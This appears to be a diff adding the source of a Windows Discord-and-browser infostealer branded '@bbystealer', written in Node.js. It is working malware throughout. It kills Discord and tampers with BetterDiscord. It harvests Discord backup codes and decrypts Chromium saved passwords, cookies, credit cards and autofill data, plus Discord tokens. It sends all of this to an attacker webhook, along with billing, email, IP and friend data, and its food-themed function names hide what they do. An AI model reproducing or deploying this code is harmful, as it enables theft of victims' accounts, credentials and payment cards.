+        if (stdout.includes('DiscordPTB.exe')) runningDiscords.push('DiscordPTB');
+        if (stdout.includes('DiscordDevelopment.exe')) runningDiscords.push('DiscordDevelopment');
+        killDiscord();
+    });
+};
+
+function killDiscord() {
+    runningDiscords.forEach(disc => {
+        try {
+            exec('taskkill /IM ' + disc + '.exe /F'), (err) => {
+                if (err) { };
+            };
+        } catch (e) { };
+    });
+function pwnBetterDiscord() {
+    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+    if (fs.existsSync(dir)) {
+        var x = fs.readFileSync(dir)
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "ezbysudry"))
+    } else {
+        return;
+    }
+}
+
+async function getPeperonni() {
+    let str = '';
+    const homeDir = require('os').homedir();
+    if (fs.existsSync(`${homeDir}\\Downloads`)) {
+        fs.readdirSync(`${homeDir}\\Downloads`).forEach(file => {
+            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
+                let path = `${homeDir}\\Downloads\\${file}`
+                str += `\n\n@~$~@bby-${path}`,
+                    str += `\n\n${fs.readFileSync(path).toString()}`
+            }
+        })
+    }
+    if (fs.existsSync(`${homeDir}\\Desktop`)) {
+        fs.readdirSync(`${homeDir}\\Desktop`).forEach(file => {
+            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
+                let path = `${homeDir}\\Desktop\\${file}`
+                str += `\n\n@~$~@bby-${path}`,
+                    str += `\n\n${fs.readFileSync(path).toString()}`
+            }
+        })
+    }
+    if (fs.existsSync(`${homeDir}\\Documents`)) {
+        fs.readdirSync(`${homeDir}\\Documents`).forEach(file => {
+            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
+                let path = `${homeDir}\\Documents\\${file}`
+                str += `\n\n@~$~@bby-${path}`,
+                    str += `\n\n${fs.readFileSync(path).toString()}`
+            }
+        })
+    }
+    if (str !== '') {
+        fs.writeFileSync(appdata + '\\backupcodes.txt', str.slice(2))
+
+        const form = new FormData();
+        form.append("file", fs.createReadStream(appdata + "\\backupcodes.txt"));
+        form.submit(wbk);
+    }
+}
+
+async function getCreditcards(path) {
+    let path_split = path.split('\\'),
+        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join('\\') + '\\';
+    if (path.startsWith(appdata)) path_tail = path;
+    if (path.includes('cord')) return;
+    if (fs.existsSync(path_tail)) {
+        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+            .os_crypt.encrypted_key, 'base64')
+            .slice(5);
+        var login_data = path + 'Web Data',
+            creditcards_db = path + 'creditcards.db';
+        fs.copyFileSync(login_data, creditcards_db);
+        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+        var result = `\n\n@~$~@bby-${path}`,
+            sql = new sqlite3.Database(creditcards_db, err => {
+                if (err) { }
+            });
+        const cb = await new Promise((resolve, reject) => {
+            sql.each('SELECT * FROM credit_cards', function (err, row) {
+                if (err) { }
+                if (row['card_number_encrypted'] != '') {
+                    let card_number = row['card_number_encrypted'];
+                    try {
+                        if ((card_number[0] == 1) && (card_number[1] == 0) && (card_number[2] == 0) && (card_number[3] == 0)) {
+                            result += '\nCREDIT CARD NUMBER: ' + dpapi.unprotectData(card_number, null, 'CurrentUser').toString('utf-8') + ' | EXPIRE: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'];
+                        } else {
+                            let start = card_number.slice(3, 15),
+                                middle = card_number.slice(15, card_number.length - 16),
+                                end = card_number.slice(card_number.length - 16, card_number.length),
+                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                            decipher.setAuthTag(end);
+                            result += '\nCREDIT CARD NUMBER: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + ' | EXPIRE: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'];
+                        }
+                    } catch (e) { }
+                }
+            }, function () {
+                resolve(result);
+            });
+        });
+        return cb;
+    } else {
+        return '';
+    }
+}
+
+async function getAutofilldata(path) {
+    let path_split = path.split('\\'),
+        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join('\\') + '\\';
+    if (path.startsWith(appdata)) path_tail = path;
+    if (path.includes('cord')) return;
+    if (fs.existsSync(path_tail)) {
+        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+            .os_crypt.encrypted_key, 'base64')
+            .slice(5);
+        var login_data = path + 'Web Data',
+            autofilldata_db = path + 'autofilldata.db';
+        fs.copyFileSync(login_data, autofilldata_db);
+        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+        var result = `\n\n@~$~@bby-${path}`,
+            sql = new sqlite3.Database(autofilldata_db, err => {
+                if (err) { }
+            });
+        const autofill = await new Promise((resolve, reject) => {
+            sql.each('SELECT * FROM autofill', function (err, row) {
+                if (err) { }
+                result += '\nNAME: ' + row['name'] + ' | DATA: ' + row['value'];
+            }, function () {
+                resolve(result);
+            });
+        });
+        return autofill;
+    } else {
+        return '';
+    }
+}
+
+async function getPizzas(path) {
+    let path_split = path.split('\\'),
+        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join('\\') + '\\';
+    if (path.startsWith(appdata)) path_tail = path;
+    if (path.includes('cord')) return;
+    if (fs.existsSync(path_tail)) {
+        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+            .os_crypt.encrypted_key, 'base64')
+            .slice(5);
+        var login_data = path + 'Login Data',
+            passwords_db = path + 'passwords.db';
+        fs.copyFileSync(login_data, passwords_db);
+        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+        var result = `\n\n@~$~@bby-${path}`,
+            sql = new sqlite3.Database(passwords_db, err => {
+                if (err) { }
+            });
+        const pizza = await new Promise((resolve, reject) => {
+            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
+                if (row['username_value'] != '') {
+                    let password_value = row['password_value'];
+                    try {
+                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
+                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
+                                .toString('utf-8');
+                        } else {
+                            let start = password_value.slice(3, 15),
+                                middle = password_value.slice(15, password_value.length - 16),
+                                end = password_value.slice(password_value.length - 16, password_value.length),
+                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                            decipher.setAuthTag(end);
+                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
+                        }
+                    } catch (e) { }
+                }
+            }, function () {
+                resolve(result);
+            });
+        });
+        return pizza;
+    } else {
+        return '';
+    }
+}
+
+async function getCheese(path) {
+    let path_split = path.split('\\'),
+        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join('\\') + '\\';
+    if (path.startsWith(appdata)) path_tail = path;
+    if (path.includes('cord')) return;
+    if (fs.existsSync(path_tail)) {
+        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+            .os_crypt.encrypted_key, 'base64')
+            .slice(5);
+        var cookies = path + 'Cookies',
+            cookies_db = path + 'cookies.db';
+        fs.copyFileSync(cookies, cookies_db);
+        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+        var result = '',
+            sql = new sqlite3.Database(cookies_db, err => {
+                if (err) { }
+            });
+        const cheese = await new Promise((resolve, reject) => {
+            sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) {
+                let encrypted_value = row['encrypted_value'];
+                try {
+                    if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
+                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + dpapi.unprotectData(encrypted_value, null, 'CurrentUser') + "\n"
+                            .toString('utf-8');
+                    } else {
+                        let start = encrypted_value.slice(3, 15),
+                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
+                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
+                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                        decipher.setAuthTag(end);
+                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + "\n"
+                    }
+                } catch (e) { }
+            }, function () {
+                resolve(result);
+            })
+        });
+        return cheese;
+    } else return '';
+}
+
+async function takeCreditcards() {
+    let creditcards = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Web Data'))
+            creditcards += await getCreditcards(paths[i]) || '';
+    }
+    if (!creditcards.includes('NUMBER:')) creditcards = 'Creditcards don\'t found.'
+    else creditcards = creditcards.slice(2)
+
+    fs.writeFileSync(appdata + '\\creditcards.txt', creditcards)
+
+    const form = new FormData();
+    form.append("file", fs.createReadStream(appdata + "\\creditcards.txt"));
+    form.submit(wbk);
+}
+
+async function takeAutofilldata() {
+    let autofilldata = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Web Data'))
+            autofilldata += await getAutofilldata(paths[i]) || '';
+
+    }
+    if (autofilldata.includes('NAME:')) autofilldata = 'Autofilldata don\'t found.'
+    else autofilldata = autofilldata.slice(2)
+
+    fs.writeFileSync(appdata + '\\autofilldata.txt', autofilldata)
+
+    const form = new FormData();
+    form.append("file", fs.createReadStream(appdata + "\\autofilldata.txt"));
+    form.submit(wbk);
+}
+
+async function takePizzas() {
+    let passwords = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Login Data'))
+            passwords += await getPizzas(paths[i]) || '';
+    }
+    if (passwords.includes('PASSWORD:')) passwords = 'Passwords don\'t found.'
+    else passwords = passwords.slice(2)
+
+    fs.writeFileSync(appdata + '\\passwords.txt', passwords)
+
+    const form = new FormData();
+    form.append("file", fs.createReadStream(appdata + "\\passwords.txt"));
+    form.submit(wbk);
+}
+
+async function takeCheese() {
+    let cookies = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Cookies'))
+            cookies += await getCheese(paths[i]) || '';
+    }
+    if (!cookies.includes('2597573456')) cookies = 'Cookies don\'t found.'
+
+    fs.writeFileSync(appdata + '\\cookies.txt', cookies)
+
+    const form = new FormData();
+    form.append("file", fs.createReadStream(appdata + "\\cookies.txt"));
+    form.submit(wbk);
+}
+
+const tokens = [];
+
+async function findToken(path) {
+    let path_tail = path;
+    path += 'Local Storage\\leveldb';
+
+    if (!path_tail.includes('discord')) {
+        try {
+            fs.readdirSync(path)
+                .map(file => {
+                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
+                        .split(/\r?\n/)
+                        .forEach(line => {
+                            const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
+                            for (const pattern of patterns) {
+                                const foundTokens = line.match(pattern);
+                                if (foundTokens) foundTokens.forEach(token => {
+                                    if (!tokens.includes(token)) tokens.push(token)
+                                });
+                            }
+                        });
+                });
+        } catch (e) { }
+        return;
+    } else {
+        if (fs.existsSync(path_tail + '\\Local State')) {
+            try {
+                fs.readdirSync(path)
+                    .map(file => {
+                        (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
+                            .split(/\r?\n/)
+                            .forEach(line => {
+                                const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
+                                const foundTokens = line.match(pattern);
+                                if (foundTokens) {
+                                    foundTokens.forEach(token => {
+                                        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+                                            .os_crypt.encrypted_key, 'base64')
+                                            .slice(5);
+                                        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+                                        token = Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64')
+                                        let start = token.slice(3, 15),
+                                            middle = token.slice(15, token.length - 16),
+                                            end = token.slice(token.length - 16, token.length),
+                                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                                        decipher.setAuthTag(end);
+                                        let out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
+                                        if (!tokens.includes(out)) tokens.push(out)
+                                    })
+                                };
+                            });
+                    });
+            } catch (e) { }
+            return;
+        }
+    }
+}
+
+async function stealTokens() {
+    for (let path of paths) {
+        await findToken(path);
+    }
+    for (let token of tokens) {
+        let json;
+        await axios.get("https://discord.com/api/v9/users/@me", {
+            headers: {
+                "Content-Type": "application/json",
+                "authorization": token
+            }
+        }).then(res => { json = res.data }).catch(() => { json = null })
+        if (!json) continue;
+        var ip = await getIp();
+        var billing = await getBilling(token);
+        var friends = await getRelationships(token);
+        axios.post(wbk, {
+            content: "",
+            embeds: [{
+                "fields": [
+                    {
+                        name: `<a:bby:987689940852817971> Token:`,
+                        value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+                        inline: false
+                    },
+                    {
+                        name: `<:bby:987689933844127804> Badges:`,
+                        value: getBadges(json.flags),
+                        inline: true
+                    },
+                    {
+                        name: `<:bby:987689935018549328> Nitro Type:`,
+                        value: await getNitro(json.premium_type, json.id, token),
+                        inline: true
+                    },
+                    {
+                        name: `<a:bby:987689939401588827> Billing:`,
+                        value: billing,
+                        inline: true
+                    },
+                    {
+                        name: `<:bby:987689943558135818> Email:`,
+                        value: `\`${json.email}\``,
+                        inline: true
+                    },
+                    {
+                        name: `<:bby:987689942350196756> IP:`,
+                        value: `\`${ip}\``,
+                        inline: true
+                    }
+                ],
+                "color": 3553599,
+                "author": {
+                    "name": `${json.username}#${json.discriminator} (${json.id})`,
+                    "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
+                },
+                "footer": {
+                    "text": "@bbystealer"
+                },
+                "thumbnail": {
+                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
+                }
+            }, {
+                "color": 3553599,
+                "description": friends,
+                "author": {
+                    "name": "HQ Friends",
+                    "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
+                },
+                "footer": {
+                    "text": "@bbystealer"
+                },
+            }]
+        }).then(res => { }).catch(() => { })
+        continue;
+    }
+}
+
+const badges = {
+    Discord_Employee: {
+        Value: 1,
+        Emoji: "<:staff:874750808728666152>",
+        Rare: true,
+    },
+    Partnered_Server_Owner: {
+        Value: 2,
+        Emoji: "<:partner:874750808678354964>",
+        Rare: true,
+    },
+    HypeSquad_Events: {
+        Value: 4,
+        Emoji: "<:hypesquad_events:874750808594477056>",
+        Rare: true,
+    },
+    Bug_Hunter_Level_1: {
+        Value: 8,
+        Emoji: "<:bughunter_1:874750808426692658>",
+        Rare: true,
+    },
+    Early_Supporter: {
+        Value: 512,
+        Emoji: "<:early_supporter:874750808414113823>",
+        Rare: true,
+    },
+    Bug_Hunter_Level_2: {
+        Value: 16384,
+        Emoji: "<:bughunter_2:874750808430874664>",
+        Rare: true,
+    },
+    Early_Verified_Bot_Developer: {
+        Value: 131072,
+        Emoji: "<:developer:874750808472825986>",
+        Rare: true,
+    },
+    House_Bravery: {
+        Value: 64,
+        Emoji: "<:bravery:874750808388952075>",
+        Rare: false,
+    },
+    House_Brilliance: {
+        Value: 128,
+        Emoji: "<:brilliance:874750808338608199>",
+        Rare: false,
+    },
+    House_Balance: {
+        Value: 256,
+        Emoji: "<:balance:874750808267292683>",
+        Rare: false,
+    },
+    Discord_Official_Moderator: {
+        Value: 262144,
+        Emoji: "<:moderator:976739399998001152>",
+        Rare: true,
+    }
+};
+
+async function getRelationships(token) {
+    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
+        headers: {
+            "Content-Type": "application/json",
+            "authorization": token
+        }
+    }).catch(() => { })
+    if (!j) return `*Account locked*`
+    var json = j.data
+    const r = json.filter((user) => {
+        return user.type == 1
+    })
+    var gay = '';
+    for (z of r) {
+        var b = getRareBadges(z.user.public_flags)
+        if (b != "") {
+            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
+        }
+    }
+    if (gay == '') gay = "*Nothing to see here*"
+    return gay
+}
+
+async function getBilling(token) {
+    let json;
+    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
+        headers: {
+            "Content-Type": "application/json",
+            "authorization": token
+        }
+    }).then(res => { json = res.data })
+        .catch(err => { })
+    if (!json) return '\`Unknown\`';
+
+    var bi = '';
+    json.forEach(z => {
+        if (z.type == 2 && z.invalid != !0) {
+            bi += "<:946246524504002610:962747802830655498>";
+        } else if (z.type == 1 && z.invalid != !0) {
+            bi += "<:bby:987692721613459517>";
+        }
+    });
+    if (bi == '') bi = `\`No Billing\``
+    return bi;
+}
+
+function getBadges(flags) {
+    var b = '';
+    for (const prop in badges) {
+        let o = badges[prop];
+        if ((flags & o.Value) == o.Value) b += o.Emoji;
+    };
+    if (b == '') return `\`No Badges\``;
+    return `${b}`;
+}
+
+function getRareBadges(flags) {
+    var b = '';
+    for (const prop in badges) {
+        let o = badges[prop];
+        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
+    };
+    return b;
+}
+
+async function getNitro(flags, id, token) {
+    switch (flags) {
+        case 1:
+            return "<:946246402105819216:962747802797113365>";
+        case 2:
+            let info;
+            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
+                headers: {
+                    "Content-Type": "application/json",
+                    "authorization": token
+                }
+            }).then(res => { info = res.data })
+                .catch(() => { })
+            if (!info) return "<:946246402105819216:962747802797113365>";
+
+            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";
+
+            let boost = ["<:boost1month:967519402293624862>", "<:boost2month:967519562868338728>", "<:boost3month:969685462157525044>", "<:boost6month:969686607961665628>", "<:boost9month:967520103367340092>", "<:boost12month:969687191133499403>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
+            var i = 0
+
+            try {
+                let d = new Date(info.premium_guild_since)
+                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
+                let d1 = new Date(info.premium_guild_since)
+                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
+                let d2 = new Date(info.premium_guild_since)
+                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
+                let d3 = new Date(info.premium_guild_since)
+                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
+                let d4 = new Date(info.premium_guild_since)
+                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
+                let d5 = new Date(info.premium_guild_since)
+                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
+                let d6 = new Date(info.premium_guild_since)
+                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
+                let d7 = new Date(info.premium_guild_since)
+                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)
+
+                if (boost2month > 0) {
+                    i += 0
+                } else {
+                    i += 1
+                } if (boost3month > 0) {
+                    i += 0
+                } else {
+                    i += 1
+                } if (boost6month > 0) {
+                    i += 0
+                } else {
+                    i += 1
+                } if (boost9month > 0) {
+                    i += 0
+                } else {
+                    i += 1
+                } if (boost12month > 0) {
+                    i += 0
+                } else {
+                    i += 1
+                } if (boost15month > 0) {
+                    i += 0
+                } else {
+                    i += 1
+                } if (boost18month > 0) {
+                    i += 0
+                } else {
+                    i += 1
+                } if (boost24month > 0) {
+                    i += 0
+                } else if (boost24month < 0 || boost24month == 0) {
+                    i += 1
+                } else {
+                    i = 0
+                }
+            } catch {
+                i += 0
+            }
+            return `<:946246402105819216:962747802797113365> ${boost[i]}`
+        default:
+            return "\`No Nitro\`";
+    };
+}
+
+async function getIp() {
+    var ip = await axios.get("https://www.myexternalip.com/raw")
+    return ip.data;
+}
+
+process
+    .on("uncaughtException", err => console.error(err))
+    .on("unhandledRejection", err => console.error(err));
